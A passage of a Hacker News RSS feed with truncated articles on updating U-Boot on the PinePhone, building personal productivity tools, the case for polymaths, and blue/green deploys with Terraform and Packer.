<p>Bootstrapping is complicated by initial memory address space limitations. The <a href="https://linux-sunxi.org/BROM#U-Boot%5FSPL%5Flimitations">SPL is limited to 32 KiB</a>, most likely because the BootROM, or BROM, loads the SPL into <a href="https://linux-sunxi.org/A64/Memory%5Fmap">SRAM A1</a>, which is a <code>32 KiB</code> subsection. If the SPL is larger than <code>32 KiB</code> the BROM will refuse to load it. After the SPL loads U-Boot proper and passes execution to the ATF, U-Boot proper in turn runs <a href="https://gitlab.com/postmarketOS/pmaports/-/blob/master/device/community/device-pine64-pinephone/uboot-script.cmd">the Pine Phone’s u-boot command script</a>. The command script sets the default bootargs for init and calls the <a href="https://gitlab.denx.de/u-boot/u-boot/-/blob/master/cmd/booti.c">booti command</a>, which boots the Linux Kernel Image from memory given the <em>flattend device tree</em> (<a href="https://devicetree-specification.readthedocs.io/en/latest/flattened-format.html">FDT</a>) and the <em>initial ramdisk</em> (<a href="https://en.wikipedia.org/wiki/Initrd">initrd</a>), ultimately passing execution to Linux init.</p>



<div>
  
<div><pre><code data-lang="text">+-----------------------+
|        BootROM        |
+-----------.-----------+
|
|
+-----------V-----------+
|     u-boot.itb+SPL    |
+-----------.-----------+
|
|
+-----------V-----------+
|       TF-A BL31       |
+-----------.-----------+
|
|
+-----------V-----------+
| U-Boot Proper (=BL33) |
+-----------.-----------+
|
|
+-----------V-----------+
|        Linux          |
+-----------------------+</code></pre></div>
</div>

<p>You might have noticed that <code>/usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin</code> is much larger than <code>32KiB</code>.</p>
<div><pre><code data-lang="text">second-chance:~$ ls -lh /usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin
-rw-r--r--    1 root     root      486.0K Jun 20 12:41 /usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin</code></pre></div>
<p>That is because the SPL binary image includes a <em>Flattened uImage Tree</em> (<a href="https://gitlab.com/pine64-org/u-boot/-/blob/master/doc/uImage.FIT/source%5Ffile%5Fformat.txt">FIT image</a>) named <code>u-boot.itb</code> that contains the rest of the firmware.</p>

<h2 id="determine-which-bootable-storage-device-is-relevant">Determine which bootable storage device is relevant</h2>

<p>Before you can <a href="#how-to-determine-if-u-boot-needs-to-be-upgraded">determine if U-Boot needs to be upgraded</a>, you need to know which storage device your PinePhone is booting from. This can be easily determined by using the <a href="https://linux.die.net/man/8/lsblk">lsblk(8)</a> command to list the running operating system’s current mount points. Below is the output of <a href="https://linux.die.net/man/8/lsblk">lsblk(8)</a> run on my PinePhone booted from an <code>SD</code> card:</p>
<div><pre><code data-lang="sh">second-chance:~$ lsblk --output NAME,TYPE,MOUNTPOINT</code></pre></div><div><pre><code data-lang="text">NAME         TYPE MOUNTPOINT
mmcblk0      disk
├─mmcblk0p1  part /boot
└─mmcblk0p2  part
mmcblk2      disk
├─mmcblk2p1  part
├─mmcblk2p2  part
├─mmcblk2p1  part
└─mmcblk2p2  part
mmcblk2boot0 disk
mmcblk2boot1 disk</code></pre></div>
<p>The disk corresponding to the <code>/boot</code> mountpoint is the name of the block special device that postmarketOS is currently running form. The device path to the relevant boot storage device is therefore <code>/dev/mmcblk0</code>. We will be using this device name in the next two sections to determine if an upgrade is needed and again to perform the actual upgrade if warranted. You must be careful to use the device name that is relevant to your own running environment if you are following along.</p>

<h2 id="how-to-determine-if-u-boot-needs-to-be-upgraded">How to determine if U-Boot needs to be upgraded?</h2>

<p>You can determine if an upgrade is necessary simply by comparing the version of U-Boot installed by the <code>u-boot-pinephone</code> package with the version of U-Boot that is written to <a href="#determine-which-bootable-storage-device-is-relevant">the bootable storage device which is relevant to your running environment</a>.</p>

<p>To see which version of <code>U-Boot</code> was installed by the <code>u-boot-pinephone</code> package, simply run the <code>apk policy</code> sub command as shown below:</p>
<div><pre><code data-lang="sh">second-chance:~/$ apk policy u-boot-pinephone</code></pre></div><div><pre><code data-lang="text">u-boot-pinephone policy:
  2020.04_git20200421-r1:
    lib/apk/db/installed
    etc/apk/cache
    http://postmarketos1.brixit.nl/postmarketos/master</code></pre></div>
<p>Alternatively, you can use the <a href="https://linux.die.net/man/1/busybox">busybox(1)</a> <code>strings</code> command to search the binary’s printable strings for the regex pattern <code>U-Boot [[:digit:]]</code> by piping the output through a <a href="https://linux.die.net/man/1/busybox">busybox(1)</a> <code>grep</code> filter. As a side note, the PinePhone uses busybox, so when you find yourself looking up command line documentation with the intention of running the command from a PinePhone shell, always check the <a href="https://linux.die.net/man/1/busybox">busybox(1)</a> man pages first.</p>
<div><pre><code data-lang="sh">second-chance:~/packages$ strings /usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin | grep -E <span>'U-Boot [[:digit:]]'</span></code></pre></div><div><pre><code data-lang="text">U-Boot 2020.04 (Jun 20 2020 - 12:41:48 +0000)</code></pre></div>
<p>Similarly, to determine the version of U-Boot that is currently written to bootable storage, you can search for the same regex pattern in the printable strings of the boot disk after the first <code>8 KiB</code>. However, since the bootable storage is significantly larger than <code>u-boot-sunxi-with-spl.bin</code>, it would not be efficient to use the <code>strings</code> command as we did previously. Instead, we will use the <a href="https://linux.die.net/man/1/busybox">busybox(1)</a> <code>dd</code> command, which will allow us to control where to begin and end the search. Since we can’t easily know the exact offset of the version string, which can very from build to build, my strategy has been to simply skip the first <code>8 KiB</code> and then read the same number of <code>KiB</code> as the size of the currently installed <code>u-boot-sunxi-with-spl.bin</code>. If my search turns up nothing, then that means that the previously installed version was larger, and I can simply increase the <code>count</code> to some reasonable number of <code>KiB</code> until I find what I am looking for.</p>

<p>First, let’s determine the size of <code>u-boot-sunxi-with-spl.bin</code>.</p>
<div><pre><code data-lang="sh">ls -lh /usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin</code></pre></div><div><pre><code data-lang="text">-rw-r--r--    1 root     root      543.3K Jul 18  2020 /usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin</code></pre></div>
<p>The binary installed to disk is about <code>5…</code></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bloggerbust.ca/post/how-to-update-uboot-for-postmarketos-on-the-pinephone/">https://bloggerbust.ca/post/how-to-update-uboot-for-postmarketos-on-the-pinephone/</a></em></p>]]>
            </description>
            <link>https://bloggerbust.ca/post/how-to-update-uboot-for-postmarketos-on-the-pinephone/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24244407</guid>
            <pubDate>Sat, 22 Aug 2020 14:35:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build tools around workflows, not workflows around tools]]>
            </title>
            <description>
<![CDATA[
Score 435 | Comments 135 (<a href="https://news.ycombinator.com/item?id=24244329">thread link</a>) | @thesephist
<br/>
August 22, 2020 | https://thesephist.com/posts/tools/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/tools/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><em>This March, I spent a couple of days traveling through western Iceland.</em></p>
<p><img src="https://thesephist.com/img/iceland.jpg" alt="Iceland, part 1"></p>
<p>While I was there, I thought a lot about tools – mechanical tools, software tools, tools that last, and tools that are fragile. The somber snow-covered scenery made me think about how quickly most of the tools we use today get outdated or replaced, and I thought about the kinds of tools that I’ve been building for myself for the last few years to help organize my life.</p>
<p>I took a walk around <em>Smábátahöfnin í Keflavík</em> (a small marina nearby) that night, unraveled myself into my hotel room, and started writing this post.</p>
<p>I want to share why I build my own tools and how I think we should think about building tools for life. It’s long, so here’s a roadmap. Feel free to jump around.</p>
<ol>
<li><a href="#my-tools-today">My tools, today</a></li>
<li><a href="#workflows--tools">Workflows &gt; tools</a>
<ol>
<li><a href="#tasks-and-notes-a-false-dichotomy">Tasks and notes, a false dichotomy</a></li>
<li><a href="#tools-that-grow-with-your-workflows">Tools that grow with your workflows</a></li>
</ol>
</li>
<li><a href="#own-your-load-bearing-tools-of-life">Own your load-bearing tools of life</a></li>
<li><a href="#cost-and-other-smaller-benefits">Cost and other smaller benefits</a></li>
<li><a href="#your-tools-are-an-extension-of-you">Your tools are an extension of you</a></li>
<li><a href="#appendix-the-technical-nitty-gritty">Appendix: the technical nitty-gritty</a></li>
</ol>
<hr>

<p>For the last few years, I’ve been on a journey to replace all of the essential digital tools I use for organizing my life with tools I develop, maintain, and deploy myself.</p>
<p>What started with a single-page notes app I made in high school has grown into a constellation of home-grown productivity tools I now rely on for my day-to-day work and learning. Here’s a sample.</p>
<ul>
<li>
<p><a href="https://github.com/thesephist/polyx#ligature">Ligature</a>, for long-term notes and tasks, goals, brainstorming, project planning, and other important writing.</p>
<p><img src="https://thesephist.com/img/ligature.jpg" alt="Ligature"></p>
</li>
<li>
<p><a href="https://github.com/thesephist/pico">Pico</a>, for more ephemeral notes and tasks that change on a daily basis. I split up my notes into two apps (Ligature and Pico) because it works better for my workflow. (More on this later.)</p>
<p><img src="https://thesephist.com/img/pico.jpg" alt="Pico"></p>
</li>
<li>
<p><a href="https://github.com/thesephist/mira">Mira</a> for keeping track of people I know, why they’re interesting, and what we’ve talked about.</p>
<p><img src="https://thesephist.com/img/mira.png" alt="Mira"></p>
</li>
<li>
<p><a href="https://github.com/thesephist/lovecroft">Lovecroft</a> for managing and sending emails to my <a href="https://thesephist.com/#newsletter">mailing lists</a>.</p>
<p><img src="https://thesephist.com/img/lovecroft.jpg" alt="Lovecroft"></p>
</li>
<li>
<p><a href="https://github.com/thesephist/polyx#noct">Noct</a> for backing up and syncing all my files across computers and the cloud. Noct doesn’t have a graphical UI, just a command-line tool.</p>
</li>
<li>
<p><a href="https://thesephist.com/posts/frieden/">Frieden</a> as a public availability calendar, showing when I’m free or busy.</p>
<p><img src="https://thesephist.com/img/frieden.png" alt="Frieden"></p>
</li>
<li>
<p><a href="https://github.com/thesephist/thingboard">Thingboard</a> for more free-form Post-its-on-the-wall style brainstorming.</p>
<p><img src="https://thesephist.com/img/thingboard.jpg" alt="Thingboard"></p>
</li>
<li>
<p><a href="https://codeframe.co/">Codeframe</a> for spinning off simple JavaScript experiments like <a href="https://thesephist.com/posts/word-experiments/#word-plotter">the word plotter</a>.</p>
<p><img src="https://thesephist.com/img/codeframe.jpg" alt="Codeframe"></p>
</li>
<li>
<p><a href="https://github.com/thesephist/draw">draw</a>, a collaborative whiteboard, best used with my iPad Pro and Apple Pencil.</p>
<p><img src="https://thesephist.com/img/draw.jpg" alt="Draw"></p>
</li>
</ul>
<p>Taken together, these apps do almost everything I need to do on my computer to keep myself organized. I don’t use any third-party notes, task management, or contacts apps, though I used to be a big fan of Simplenote and Todoist. I’ve used Notion, Dropbox Paper, Google Docs, and Airtable, but only for working in teams that centralized on them. These days, besides email and calendar, I live within a system of my own tools, and it works well for me.</p>
<p>I don’t want to imply that my tools are objectively better than the professional tools on the market like Notion and Dropbox. Those latter services have more features, and might even be more reliable today. But I think my tools fit me better for a different reason.</p>

<p>Each person’s mind works a little differently, and each person remembers and processes information a little differently. I think we all work at our best when we work with tools that fit how our minds work.</p>
<p>The Eureka moment that some of us feel when we finally find a notes app or todo system that fits our brains – that epiphany happens when the tools we use mirror the way our minds work, and how we want to move information through our lives. Good tools fit perfectly around our workflows, bad tools don’t.</p>
<p>When we resort to having other people build tools for us, the tools they build might never quite perfectly fit our workflows, because they’re not built for our individual minds. When other people build tools for us to use, they either design tools after their own workflows and mental models, or worse, they design it for a mass market of millions of people who all sort-of-but-not-really work and think in similar ways. The result is that mass-market productivity tools don’t fit the way our individual minds are predisposed to work. Instead, to use these tools, we need to bend our workflows to fit around the tools.</p>
<p>My biggest benefit from writing my own tool set is that <strong>I can build the tools that exactly conform to my workflows, rather than constructing my workflows around the tools available to me.</strong> This means the tools can truly be an extension of the way my brain thinks and organizes information about the world around me. My tools aren’t perfect yet, but as they grow and evolve, they’ll only become better reflections of my personal mental models.</p>
<p>For example, one place where my mind works differently than the tools on the market is the task/notes distinction.</p>
<h3 id="tasks-and-notes-a-false-dichotomy">Tasks and notes, a false dichotomy</h3>
<p>My workflow used to differentiate between tasks and notes. Tasks were action items that I could reference, take action on, and complete, and then erase from my list. Notes were things that were indefinitely relevant. I would take notes and then come back to reference them many times. A note by itself isn’t actionable.</p>
<p>But once I started building my own tools, I realized this distinction isn’t really the way my brain worked. For me, a huge grey area exists between actionable, completable tasks and purely encyclopedic notes. Here are some things that fall in the grey area for me, pulled from my real, actual notes I took this week.</p>
<ol>
<li>I recently learned some really useful tips about how to grow leaders within a community from the book <em><a href="https://gettogetherbook.com/">Get Together</a></em>. I definitely want to act on these learnings at some point in the communities I lead, but I don’t want them cluttering up my todo list because they’re not things I can just complete and check off quickly. I also want to remember these tips forever, even after the first time I act on them.</li>
<li>I’ve been brainstorming an idea for a side project related to <a href="https://en.wikipedia.org/wiki/Computer_algebra">symbolic mathematics</a>. I’ve been writing down my inspirations related to this project. I don’t want to tuck it away in my notes, because this is something I want to build soon, but I also don’t want to shove paragraphs of notes into a todo list item.</li>
<li>I keep a running list of ideas I have for future blog posts, but I don’t really have a “write the next blog post” task item under which I’d normally put these ideas, because I don’t write on schedule – I just write when I can. Where should these ideas go? They’re sort-of notes and sort-of tasks.</li>
</ol>
<p>You might think that these are either very clearly todo items or very clearly notes, and that’s ok. But I certainly felt differently, and I realized I was only separating things into these two buckets because my tools forced me to. Before I wrote my own tools, I had a todo app (Todoist) and I had a notes app (Simplenote), and there was nothing in between.</p>
<p>Eventually, I discovered a better mental model for my working style: I ask myself <em>how immediately</em> I need to take action on something.</p>
<p>The way that I see it, everything I learn and jot down is something for me to act on at some point in my life. If I read something that I never thought would influence the way I lived, it wouldn’t have value to me, and I simply wouldn’t write it down. Armed with this insight, these days, I have two different notes apps, and I don’t use a todo list app. These two apps are Ligature and Pico, mentioned above.</p>
<p>One is for notes that are changing often. Day-to-day tasks, things to remember for the next week, even long notes and links related to what I’m working on <em>now</em>. The other app is for notes that grow over time, like notes I take while reading books or watching talks, my annual goals, financial planning, reading list, and project outlines. <strong>My two notes apps mirror the way my brain works best – one is my short-term, working memory, the other is my long-term memory.</strong></p>
<p>I’ve had this system for a few months now, and haven’t felt any need for something better. It doesn’t have the crazy features of some notes services on the market today, but it just works the way my brain does.</p>
<p>But what if I need something different later on in life?</p>
<h3 id="tools-that-grow-with-your-workflows">Tools that grow with your workflows</h3>
<p>The other benefit of building homebrew tools is that <strong>tools you build yourself can grow and change as your workflow changes over time</strong>. So if my needs do change over time, my tools can grow to accommodate exactly what I need.</p>
<p>When I first started keeping more organized notes on the interesting people I met, I started with a document in my notes app. Over time, I noticed that these notes followed a pattern: I wrote down their name and primary contact info, how I first met them, what school they went to, and what we talked about the last time we spoke.</p>
<p>So when I built Mira, my own people-manager app, I designed it around that exact workflow I had developed. When I later realized I was also recording people’s Twitter usernames in the description field, I just added a Twitter username field to each contact.</p>
<p>This is typical of the way I <em>discover</em> my workflows. <strong>I start with a minimal, bare-bones solution, and try to pick up on patterns and tricks I create for myself. And then I encode those patterns and tricks into the tools over time.</strong></p>
<p>This way, my tools can grow organically as my workflows evolve. Neither of them gets in the way of each other most of the time, and I think that was hard to appreciate before I started relying wholly on my own tools.</p>

<p>My productivity tools, especially my notes and contacts, are the load-bearing tools of my life. If they break or disappear, it’ll take a long time and a lot of effort for me to rebuild those same workflows and tools, so it’s important that they’re reliable, and that I can depend on them working for me for a long time (measured in years and decades, not quarters).</p>
<p>I’ve written at length about <a href="https://thesephist.com/posts/ownership/">the importance of ownership</a> before. I want to own the pieces of my life that are most critical, and I want agency over how these tools change over time.</p>
<p>I want these notes and ideas and workflows to stick with me as I grow as a person through the next decades. If I had to …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thesephist.com/posts/tools/">https://thesephist.com/posts/tools/</a></em></p>]]>
            </description>
            <link>https://thesephist.com/posts/tools/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24244329</guid>
            <pubDate>Sat, 22 Aug 2020 14:23:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Polymath Playbook]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24244316">thread link</a>) | @joubert
<br/>
August 22, 2020 | https://salman.io/blog/polymath-playbook/ | <a href="https://web.archive.org/web/*/https://salman.io/blog/polymath-playbook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		


		

		<div>
			<p>You’ve likely heard the saying: “A jack of all trades is a master of none.” It warns against the futility of pursuing too many disciplines. Be a specialist, or you’ll be nothing.</p>
<p>It may surprise you to learn there’s actually an extended version: “A jack of all trades is a master of none, but oftentimes better than a master of one.” With a subtle addition, its meaning becomes inverted to tout the benefits of being a polymath (a.k.a. generalist).</p>
<p>Why is the former so common, and the latter so unknown?</p>
<p>The answer lies in modern society’s preference for <strong>specialization</strong>. We’ll explore its origin, the limits it places on workers’ freedoms, and how the polymath approach can offer a reprieve. Finally, I’ll share my own experiences and learnings exploring a multitude of pursuits.</p>
<h2 id="cost-of-specialization">Cost of Specialization</h2>
<p>Following unprecedented growth during the industrial revolution, businesses faced more competition than ever before. In order to thrive, they sought new ways to operate more efficiently and productively. Division of labor was the solution they were looking for. By dividing the tasks needed to produce goods and services, individual workers could focus on specific tasks rather than developing a variety of expertise.</p>
<p>One important criteria to optimize for specialization is ensuring that workers stay in the same role for prolonged periods of time. This facilitates increased efficiency by reducing the need for training and allowing individuals to iteratively improve their ability to perform similar tasks. In exchange for their loyalty, the company offers its employees the security of long-term employment, along with additional incentives including tax-sheltered retirement accounts and access to healthcare.</p>
<p>In some parts of the world, these benefits come at a heavy cost to an individual’s freedom. In the United States for example, if you’re employed with a company, you get healthcare. Otherwise, you’re out of luck. Workers are often hesitant to switch jobs (let alone spend extended time without one) out of fear of losing their healthcare benefits. Another part of the problem is that the cost of healthcare in the U.S. is so high. A few days without healthcare and a single accident can push someone into financial ruin. As a result, many people stay at the same job year after year <a href="https://www.forbes.com/sites/jackkelly/2019/10/25/more-than-half-of-us-workers-are-unhappy-in-their-jobs-heres-why-and-what-needs-to-be-done-now/#e8bfe3d20247" target="_blank">even if they’re unhappy</a>.</p>
<p>The lack of freedom might be a worthy sacrifice in exchange for job security. But therein lies the problem: few companies can actually guarantee long-term stability. Many workers already face ambiguity with their job security due to the impending effects of automation. Now, with the tornado of change brought about by the COVID pandemic, the brittleness of even large corporations’ stability has become apparent.</p>
<p>So how do we survive these waves of change? <strong>Adaptability</strong>.</p>
<p>Workers need to embrace a life of learning and self-evolution in order to thrive.</p>
<blockquote>
<p>In order to keep up with the world of 2050, you will need not merely to invent new ideas and products – you will above all need to reinvent yourself again and again.<br>
—Yuval Noah Harari</p>
</blockquote>
<p>Luckily, we have a template for how to do just that: the <strong>polymath</strong>.</p>
<p>Polymaths engage in extended learning across disparate fields, and apply their learnings to connect ideas and solve problems in unique ways. By nature, they’re well suited to thrive in a constantly changing environment.</p>
<h2 id="polymath-advantage">Polymath Advantage</h2>
<p>The key advantage that polymaths hold is their ability to develop <strong>mental models</strong> from different fields and apply them to solve problems in a unique way. This enables them to <strong>differentiate</strong> from their competition. Further, it creates opportunities for them to find truly <strong>meaningful work</strong> by pursuing their passions.</p>
<h3 id="differentiation">Differentiation</h3>
<p>One of the challenges with specialization is that it becomes harder to compete over time. This is a bit counter-intuitive. At first you might think the more ‘specialized’ you become, the more ‘rare’ your skillset is and thus, the better you are in terms of competition. There are two issues that arise as you continue down the path of linear specialization:</p>
<p><strong>1.</strong> <strong>Over-specialization</strong>: This often happens to PhD students who have pursued very niche, highly specific areas of expertise. It’s rare to find jobs that can actually serve their level of specialization. They find themselves given a choice to continue their career in academia, or take a less desirable job in the workforce that doesn’t actually leverage their unique skills.</p>
<p><strong>2.</strong> <strong>Diminishing returns</strong>: The larger your team is, the more difficult it becomes to be the <em>absolute best</em> in a particular area. As a simple example: It’s quite difficult to become the most technically proficient engineer in a given company. However, it’s much more straightforward to differentiate yourself through excellent communication skills, design sensibilities, leadership skills, and so on.</p>
<p>Once you hit the diminishing returns of specialization on one pursuit (<strong>the limits of depth</strong>), it makes sense to expand to other pursuits and diversify your skills (<strong>the opportunities of breadth</strong>).</p>
<h3 id="mental-models">Mental Models</h3>
<p>When you work in a particular industry for a while, you start to develop mental models based on its structures and dynamics. These are widely known <em>within</em> the industry, but not as much outside of it.</p>
<p>There’s where the opportunity comes in. If you find yourself working in a new area later in your life, you can combine mental models from different areas in ways that few others can.</p>
<blockquote>
<p>In the 17th century, Johannes Kepler didn’t have a wealth of existing knowledge or technology to work with. There was no concept of gravity as a force, and he had no notion of momentum that keeps the planets in motion.</p>
<p>Analogies were all he had.</p>
<p>From research on magnets, Kepler began to understand why planets moved toward and away from the sun. By picturing how boats might move in a whirlpool, Kepler began to understand the elliptical orbit patterns of planets.</p>
<p>—David Epstein, <em>Range</em></p>
</blockquote>
<p>The more pursuits you expose yourself to, the more models you have to work from, and the more you can stand out from the competition.</p>
<h3 id="purpose">Purpose</h3>
<p>I believe the strongest reason polymaths become polymaths is that they simply don’t have a choice. The urge to pursue one’s inner passions is strong, and those blessed with a variety of them often find them difficult to ignore.</p>
<p>The polymath’s search for meaning and purpose through different pursuits can be related to the Japanese concept of <em>Ikigai</em> (“a reason for being”):</p>
<p><img src="https://salman.io/img/ikigai.jpg">
</p>
<p>It can take many years or even decades before one sees any intersection between different circles. Yet a single taste can be intoxicating, and motivate a lifetime of pursuit.</p>
<p>What purpose could be greater than discovering purpose itself?</p>
<h2 id="my-inner-fox">My Inner Fox</h2>
<p>When I first began to study polymaths, I was excited to see a template for a life I didn’t know I was living. But when I started to embrace the polymath identity, my inner critics appeared. I wondered whether I’m even qualified to write about polymaths, let alone call myself one. After all, the <a href="https://notes.salman.io/the-definition-of-a-polymath" target="_blank">the definition of a polymath</a> is somewhat murky. I’ve spoken to a lot of peers who feel this same hesitation, and it’s been refreshing to connect with others who are taking a similar approach to life.</p>
<p>I also got a boost of confidence from a book called <em>Hedgehog and the Fox</em> by Isaiah Berlin. The book is a major source of inspiration for the generalist approach, and contrasts two proverbial animals: the specialist hedgehog and the generalist fox. I was elated to discover that the spirit animal for my <em><a href="https://brownfox.substack.com/" target="_blank">Quick Brown Fox</a></em> newsletter (inspired by <em>The Little Prince</em>’s fox) was incredibly prescient. It seems my destiny as a polymath fox was written long ago…</p>
<p><img src="https://salman.io/img/fox.png">
</p>
<p>I’ve been lucky to have held a lot of different roles and explored a lot of varied interests in my life. I’ve been a startup founder, software engineer, manager, teacher, public speaker, advisor, DJ and writer. Some of these are roles I’ve explored for decades, while others for just a year. Beyond that, I’ve also spent a lot of time on artistic hobbies like illustration and animation. In hindsight, there were a number of benefits I enjoyed as a result of combining different pursuits.</p>
<p>As a DJ, I had to learn to not just play my playlist, but to pay close attention to the audience and cater to them. Looking back, I think <a href="https://soundcloud.com/daretodj" target="_blank">each one of my sets</a> was a live lesson on how to find product-market fit.</p>
<p><img src="https://salman.io/img/salman-dj.jpg">
</p>
<p>Thanks to my <a href="https://vimeo.com/134677777" target="_blank">obsession with animation</a>, I learned to incorporate the principles of animation into the software I built. Later, when I was building digital healthcare experiences, I was able to use animation to bring the patients’ user experience to life. I brought a different perspective to the healthcare world (specifically: the idea that filling out a form could be <strong>fun</strong>).</p>
<div>
 <p><iframe src="https://player.vimeo.com/video/134677777?portrait=0" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>
</div>
<p>Through extended <a href="https://medium.com/@salmansays/teaching-in-paradise-12159066cd86" target="_blank">teaching stints at software development schools</a>, I built strong communication skills that paid dividends in future public speaking engagements as well as all my daily interactions with coworkers. As it turns out, explaining our ideas is crucial to our effectiveness, and teaching provides excellent practice for this skill.</p>
<p>The list goes on.</p>
<p>I didn’t do any of these things with a goal of being a polymath. I did them because <strong>I was drawn to them</strong>. It took many years before I started to see any benefits from mixing these pursuits.</p>
<p>Now that I’m intentionally embracing a polymath life, I hope to see the benefits compound even more. I’m excited to see how this plays out!</p>
<h2 id="freedom-isnt-free">Freedom Isn’t Free</h2>
<p>We’ve talked a lot about the benefits of the polymath lifestyle. I’d be remiss if I didn’t leave you with a few warnings about the obstacles.</p>
<p>One of the strange things about having multiple pursuits is that <strong>you never quite fit</strong> into social groups. I remember joining an iOS developers group where most of the members had been doing iOS development for more than a decade. Meanwhile, I had worked on countless platforms, in different roles across a variety of industries. We may have been in the same group, but we had lived completely different lives. It was …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://salman.io/blog/polymath-playbook/">https://salman.io/blog/polymath-playbook/</a></em></p>]]>
            </description>
            <link>https://salman.io/blog/polymath-playbook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24244316</guid>
            <pubDate>Sat, 22 Aug 2020 14:22:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blue/Green Deploys and Immutable Infrastructure with Terraform]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24244166">thread link</a>) | @jakelazaroff
<br/>
August 22, 2020 | https://jake.nyc/words/blue-green-deploys-and-immutable-infrastructure-with-terraform/ | <a href="https://web.archive.org/web/*/https://jake.nyc/words/blue-green-deploys-and-immutable-infrastructure-with-terraform/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<article>
  <header>
    <time datetime="2020-08-22 00:00:00 -0500 -0500">August 22, 2020</time>
    
  </header>
  <p>The original deploy strategy for <a href="https://songrender.com/">SongRender</a> involved using Ansible to provision and build the application servers. I was unhappy with that process for a few reasons.</p>
<ul>
<li>The application was built on production servers at the same time as they were serving live requests.</li>
<li>Old versions of the application would stay on the servers, taking up disk space. I had set up a cron job to clean these up, but cron jobs are fickle and it would still run out of space every so often.</li>
<li>Side effects of repeated updates and deploys (or worse, failed updates and deploys) could slowly accrue on the servers, a phenomenon known as configuration drift.</li>
</ul>
<p>I decided to solve these issues using <a href="https://www.digitalocean.com/community/tutorials/what-is-immutable-infrastructure">immutable infrastructure</a>: a strategy in which servers are provisioned once and then never updated. If a server’s configuration needs to change or a new version of the application needs to be deployed, an entirely new server is spun up to replace the old one.</p>
<p><a href="https://www.martinfowler.com/bliki/BlueGreenDeployment.html">Blue/green deployment</a> is a way of deploying applications that dovetails nicely with immutable infrastructure. Instead of maintaining one set of servers, you maintain two — only one of which is live at any given time. To deploy a new version of the application, you first deploy it to the backup set of servers, then make those servers live.</p>
<p>We'll implement both of these practices using three technologies:</p>
<ul>
<li>
<p><a href="https://www.packer.io/">Packer</a> lets you run shell scripts to make changes to a server, then saves the entire disk — including the operating system and whatever changes you made — into a “machine image” that you can use as a base for other servers. We'll use it to provision our servers, as well as to install and configure our application.</p>
</li>
<li>
<p><a href="https://www.terraform.io/">Terraform</a> is a “configuration-as-code” tool — you describe your desired infrastructure in a declarative language, and then Terraform diffs it with the infrastructure that actually exists. It's kind of like React, but instead of modifying a web page it configures your infrastructure.</p>
</li>
<li>
<p><a href="https://nginx.org/">nginx</a> is a popular web server and load balancer. I chose it because I was already familiar with it, but it's not particularly important that you use nginx here specifically; HAProxy or any other application load balancer should work equally well.</p>
</li>
</ul>
<p>SongRender’s infrastructure is hosted on DigitalOcean, but you can use <a href="https://www.terraform.io/docs/providers/type/cloud-index.html">any cloud provider that supports Terraform</a>. This article will focus mainly on the Terraform configuration files, and the points at which they integrate with Packer and nginx.</p>
<p>The TL;DR of how this works: one color — let's say blue — will be live. First, Packer builds a new image in the backup color green. Terraform creates a new set of green servers, using the image Packer just built. Finally, our nginx load balancer swaps the live color with the backup color, sending requests to the newly-created green set of servers instead of the previously live blue ones. To deploy the application again, the process is repeated with the colors reversed.</p>
<p>Since in a given deploy both sets of servers will have gone through both live and backup states, let’s use some more specific names. The “promoted” set will be the servers that begin in the backup state and become live, while the “demoted” set will be the servers that begin live and are changed to backup.</p>
<p>Let’s get to the code. Here's an abbreviated Packer configuration file <code>server.json</code> for building the application server image<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"variables"</span><span>:</span> <span>{</span>
    <span>"color"</span><span>:</span> <span>null</span>
  <span>}</span><span>,</span>
  <span>"provisioners"</span><span>:</span> <span>[</span><span>]</span><span>,</span>
  <span>"builders"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"type"</span><span>:</span> <span>"digitalocean"</span><span>,</span>
      <span>"api_token"</span><span>:</span> <span>"YOUR_API_TOKEN_GOES_HERE"</span><span>,</span>
      <span>"image"</span><span>:</span> <span>"ubuntu-20-04-x64"</span><span>,</span>
      <span>"size"</span><span>:</span> <span>"s-1vcpu-1gb"</span><span>,</span>
      <span>"region"</span><span>:</span> <span>"nyc3"</span><span>,</span>
      <span>"ssh_username"</span><span>:</span> <span>"root"</span><span>,</span>
      <span>"snapshot_name"</span><span>:</span> <span>"{{user `color`}}-{{timestamp}}"</span>
    <span>}</span>
  <span>]</span>
<span>}</span>
</code></pre></div><p>The <code>provisioners</code> array should contain whatever provisioning code you need to create your application server. The important bits here are the <code>color</code> variable — the color that will be promoted, which we'll pass in from the command line — and the builder's <code>snapshot_name</code>, which is the name of the machine image Packer will create. This name is mostly arbitrary, but it does need to identify the color of the image. When we get to Terraform, we'll use a regular expression to retrieve the most recent image for which the name matches each color.</p>
<p>We can build&nbsp;now the image with this command:</p>
<div><pre><code data-lang="bash">packer build -var <span>color</span><span>=</span>blue server.json
</code></pre></div><p>To get started, run this once with <code>color=green</code> as well so you have one image for each color.</p>
